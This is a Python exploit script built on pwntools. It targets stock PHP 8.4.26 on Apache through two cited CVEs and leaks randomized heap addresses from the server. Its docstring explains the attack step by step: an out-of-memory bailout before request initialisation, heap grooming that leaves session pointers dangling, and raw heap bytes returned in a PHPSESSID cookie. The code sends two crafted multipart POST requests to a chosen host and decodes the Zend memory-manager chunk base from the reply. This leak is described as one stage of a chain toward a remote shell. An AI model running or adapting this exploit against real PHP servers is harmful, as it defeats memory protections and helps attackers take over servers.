#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2leak: zero-code remote ASLR leak via Set-Cookie: PHPSESSID=
===============================================================

Implements the application-agnostic ASLR-leak stage of the PHP2Shell chain
(CVE-2026-109618 + CVE-2026-109619, fixed in PHP 8.2.35 / 8.3.36 / 8.4.27 /
8.5.12). We only leak randomized heap addresses; we do not achieve a shell.

Target: php:8.4.26-apache-bookworm (libphp.so, x86_64, NTS, stock prefork MPM,
default php.ini, completely inert index.php with no session calls or reflection).

--------------------------------------------------------------------
1. THE PRE-RINIT WINDOW & OOM BAILOUT (CVE-2026-109619 + CVE-2026-109618)
--------------------------------------------------------------------
PHP parses a multipart/form-data body during request startup, *before* any
module RINIT runs (main/main.c):

    php_hash_environment();     /* PRE-RINIT: parse multipart, fire the
                                 *   session upload-progress callback */
    zend_activate_modules();    /* RINIT runs only after the POST body   */
    PG(modules_activated) = 1;

When a multipart request triggers an OOM fatal inside php_hash_environment(),
_zend_bailout() longjmps to php_request_shutdown(). Because
PG(modules_activated) is still 0, zend_deactivate_modules() (including session
RSHUTDOWN) is skipped, while shutdown_memory_manager() resets the request heap
(keeping heap->main_chunk mapped and unmapping secondary chunks). Module
globals in .bss survive into the next request on the same worker PID.

--------------------------------------------------------------------
2. ZERO-CODE EXFILTRATION VIA Set-Cookie: PHPSESSID=
--------------------------------------------------------------------
At MULTIPART_EVENT_FILE_START (ext/session/session.c), PHP sets PS(send_cookie)
to 0 before calling php_session_rfc1867_update() -> php_session_initialize().
Passing PHPSESSID="\x00" (length 1 so FORMDATA captures it, yet starting with a
NUL byte) enters the empty-ID branch in php_session_initialize():

    PS(mod)->s_open(&PS(mod_data), ...);          /* ps_files (40B Bin #4)   */
    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
        zend_string_release_ex(PS(id), 0);
        PS(id) = PS(mod)->s_create_sid(&PS(mod_data)); /* 64B Bin #7         */
        if (PS(use_cookies)) {
            PS(send_cookie) = 1;                  /* flips send_cookie ON!   */
        }
    }
    php_session_reset_id():
        if (PS(use_cookies) && PS(send_cookie)) {
            php_session_send_cookie();            /* <-- OOM bailout HERE!   */
            PS(send_cookie) = 0;                  /* <-- skipped on bailout! */
        }

By exhausting all free 4 KB pages across all 64 Zend MM chunks (128 MB) and
leaving one free Bin #15 (256 B) slot before UPLOAD_PROGRESS (consumed by
progress->key), php_session_send_cookie()'s smart_str allocation (256 B,
Bin #15) hits heap->limit and calls _zend_bailout() *before* PS(send_cookie)=0
or php_session_flush(1) (s_close) can run.

Three pointers in .bss now dangle into heap->main_chunk:
  * PS(id)                (64 B, Bin #7)
  * PS(mod_data)          (40 B, Bin #4: ps_files struct)
  * PS(mod_data)->basedir (32 B, Bin #3: "/tmp" zend_string)

Request 1 pre-allocates slots in heap->main_chunk for all three and frees them
onto Zend MM's LIFO free_slot[] heads right before FILE_START, placing
PS(mod_data) at page 0x57 + 0x410 (safely between Bin #6 slot 18's freelist
pointer at +0x3f0 and shadow pointer at +0x420 on Request 2).

--------------------------------------------------------------------
3. RECLAIMING PS(id) AND DECODING THE 262-BYTE LEAK
--------------------------------------------------------------------
On Request 2 (same HTTP/1.1 keep-alive connection, no file part so FILE_START
does not reset PS(id)), a 64-element packed array d0[0..63]="V"*50 allocates an
arPacked buffer (8-byte HT_MIN_MASK prefix + 64 * 16-byte zvals = 1032 B,
Bin #24) over PS(id)'s freed page (page 0x6f + 0x140):

    PS(id)+0x00..0x07  gc        <- d0[18].u1 = 0x0106
    PS(id)+0x08..0x0f  h         <- d0[19].value.str (heap ptr)
    PS(id)+0x10..0x17  len       <- d0[19].u1 = 0x0106, u2 = 0  (len = 262!)
    PS(id)+0x18..0x1f  val[0..7] <- d0[20].value.str (8-byte heap ptr!)

At MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() -> php_session_initialize():
  1. ps_open_files() cleanly closes the intact PS(mod_data) / basedir slots.
  2. php_session_reset_id() sees PS(send_cookie) == 1, calls php_url_encode()
     on all 262 bytes of ZSTR_VAL(PS(id)), and emits:
         Set-Cookie: PHPSESSID=<URL-encoded 262 raw heap bytes>
  3. Unquoting the first 8 bytes yields a full 64-bit pointer into
     heap->main_chunk; masking the low 21 bits gives the 2 MB-aligned base.
"""

import os
import re
import struct
import sys
import urllib.parse
from pwn import remote, log, context

context.log_level = "info"

HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET_HOST", "target")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("TARGET_PORT", "80"))

# Zend MM chunks are mmap'd on a 2 MB (0x200000) boundary.
CHUNK_MASK = ~0x1FFFFF & ((1 << 64) - 1)


def mp(boundary, parts):
    """Build a multipart/form-data body."""
    out = b""
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        disp = b'Content-Disposition: form-data; name="' + p["name"] + b'"'
        if "filename" in p:
            disp += b'; filename="' + p["filename"] + b'"'
            out += disp + b"\r\nContent-Type: application/octet-stream\r\n\r\n"
        else:
            out += disp + b"\r\n\r\n"
        out += p["value"] + b"\r\n"
    return out + b"--" + boundary + b"--\r\n"


def request(io, boundary, body):
    """Send one HTTP/1.1 POST over the shared keep-alive socket and read response."""
    head = (
        b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
        b"Connection: keep-alive\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
    )
    io.send(head + body)

    data = b""
    while b"\r\n\r\n" not in data:
        c = io.recv(65536)
        if not c:
            break
        data += c
    hr, br = data.split(b"\r\n\r\n", 1)
    headers = {}
    cookies = []
    for ln in hr.split(b"\r\n")[1:]:
        if b":" in ln:
            k, v = ln.split(b":", 1)
            kl = k.strip().lower()
            headers[kl] = v.strip()
            if kl == b"set-cookie":
                cookies.append(v.strip())
    n = int(headers.get(b"content-length", b"0"))
    while len(br) < n:
        c = io.recv(65536)
        if not c:
            break
        br += c
    return headers, cookies, br[:n]


def arm_body():
    """Request 1: pin PS(id) + PS(mod_data) in main_chunk and OOM in php_session_send_cookie()."""
    parts = []

    # 1. Stash small-bin strings low in heap->main_chunk (<= 8 top-level $_POST
    #    keys so $_POST->arData stays small). Overwriting them with "" after the
    #    amplifier pushes their main_chunk slots onto the LIFO heads of
    #    heap->free_slot[], ensuring FILE_START + ps_open_files() + s_create_sid()
    #    allocate inside main_chunk without requesting new 4 KB pages.
    for i in range(16):
        parts.append({"name": b"b3[%d]" % i, "value": b"S" * 5})     # 32 B (Bin #3: basedir "/tmp")
    for i in range(2):
        parts.append({"name": b"b5[%d]" % i, "value": b"S" * 20})    # 48 B (Bin #5)
    for i in range(2):
        parts.append({"name": b"b6[%d]" % i, "value": b"S" * 28})    # 56 B (Bin #6: HashTables)
    parts.append({"name": b"b8", "value": b"S" * 50})                # 80 B (Bin #8)
    parts.append({"name": b"b11", "value": b"S" * 96})               # 128 B (Bin #11: php_url_encode)
    for i, ln in enumerate([120, 120, 280, 280, 530, 530]):          # Bins #12, #16, #20
        parts.append({"name": b"sup[%d]" % i, "value": b"S" * ln})
    for i in range(11):
        parts.append({"name": b"s4[%d]" % i, "value": b"D" * 15})    # 40 B (Bin #4: ps_files)
    for i in range(2):
        parts.append({"name": b"s7[%d]" % i, "value": b"C" * 39})    # 64 B (Bin #7: PS(id))

    # 2. Exhaust all remaining 4 KB pages across all 64 Zend MM chunks (128 MB)
    #    while staying under post_max_size=8M, max_input_vars=1000, and
    #    max_input_nesting_level=64:
    #    - 846 empty uploads (filename="") x 62 deep (~6x $_FILES amplification)
    #    - 32 x 64 KB (16-page) LRUN blocks
    #    - 28 x 4 KB (1-page) LRUN mops
    #    - 14 x 256 B (Bin #15) slots so progress->key takes slot 16/16 and
    #      php_session_send_cookie()'s smart_str (Bin #15) triggers OOM!
    for i in range(846):
        parts.append({"name": b"g[%d]" % i + b"[a]" * 62, "filename": b"", "value": b""})
    for idx in range(32):
        parts.append({"name": b"q[%d]" % idx, "value": b"Q" * (16 * 4096 - 64)})
    for idx in range(28):
        parts.append({"name": b"p[%d]" % idx, "value": b"P" * 3500})
    for idx in range(14):
        parts.append({"name": b"e[%d]" % idx, "value": b"E" * 210})

    # 3. Release the stashed main_chunk slots onto LIFO free_slot[] heads.
    #    Freeing s4[2,4,6,8,10] lands PS(mod_data) at page 0x57 + 0x410 (between
    #    Bin #6 slot 18's next_free_slot at +0x3f0 and shadow ptr at +0x420).
    for i in range(2):
        parts.append({"name": b"b5[%d]" % i, "value": b""})
    for i in range(2):
        parts.append({"name": b"b6[%d]" % i, "value": b""})
    parts.append({"name": b"b8", "value": b""})
    parts.append({"name": b"b11", "value": b""})
    for i in range(4):
        parts.append({"name": b"sup[%d]" % i, "value": b""})
    for i in [2, 4, 6, 8, 10]:
        parts.append({"name": b"s4[%d]" % i, "value": b""})
    for i in range(2):
        parts.append({"name": b"s7[%d]" % i, "value": b""})
    for i in range(16):
        parts.append({"name": b"b3[%d]" % i, "value": b""})

    # 4. Arm UPLOAD_PROGRESS + PHPSESSID="\x00" + FILE_START -> s_create_sid()
    #    sets PS(send_cookie)=1, then php_session_send_cookie() OOMs!
    parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"pwn"})
    parts.append({"name": b"PHPSESSID", "value": b"\x00"})
    parts.append({"name": b"f", "filename": b"a", "value": b"x"})
    return parts


def leak_body():
    """Request 2: reclaim PS(id) with d0's arPacked and read Set-Cookie: PHPSESSID=."""
    parts = []
    # 64-element packed array d0 (arPacked = 1032 B, Bin #24) reclaims PS(id)'s
    # page; "V"*50 uses Bin #8 (80 B) so page 0x57 (Bin #6, holding PS(mod_data)
    # in an untouched slot) is not overwritten before ps_close_files() runs.
    for i in range(64):
        parts.append({"name": b"d0[%d]" % i, "value": b"V" * 50})
    # No file part -> FILE_START does not fire; MULTIPART_EVENT_END calls
    # php_session_rfc1867_cleanup() -> php_session_initialize() ->
    # php_session_reset_id() -> php_session_send_cookie()!
    parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"leak"})
    parts.append({"name": b"PHPSESSID", "value": b"Z"})
    return parts


def main():
    b = b"----Xdeadbeef"          # boundary is part of the heap-layout tuning
    io = remote(HOST, PORT)

    # --- Request 1: arm PS(id) + PS(send_cookie)=1 via OOM in php_session_send_cookie() ---
    hd1, ck1, bd1 = request(io, b, mp(b, arm_body()))
    oom = b"Allowed memory size" in bd1 and len(ck1) == 0
    log.info("arm -> OOM inside php_session_send_cookie (no cookie sent in Req 1): %s", oom)
    if not oom:
        log.warning("arm did not hit the expected OOM window (cookies=%r, body=%r)", ck1, bd1[:120])

    # --- Request 2: reclaim PS(id) and read Set-Cookie: PHPSESSID= (same socket) ---
    hd2, ck2, bd2 = request(io, b, mp(b, leak_body()))
    if not ck2:
        log.failure("no Set-Cookie header in Request 2 response (body=%r)", bd2[:120])
        return 1

    m = re.search(rb"PHPSESSID=([^;\r\n]+)", ck2[0])
    if not m:
        log.failure("PHPSESSID not found in Set-Cookie: %r", ck2[0])
        return 1

    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    log.info("Set-Cookie leaked %d raw heap bytes (first 16B: %s)", len(raw), raw[:16].hex())
    if len(raw) < 8:
        log.failure("leaked fewer than 8 bytes (%d)", len(raw))
        return 1

    ptr = struct.unpack_from("<Q", raw, 0)[0]
    chunk_base = ptr & CHUNK_MASK
    log.info("heap ptr = 0x%016x", ptr)
    log.success("Zend MM chunk base (ASLR): 0x%016x", chunk_base)
    io.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
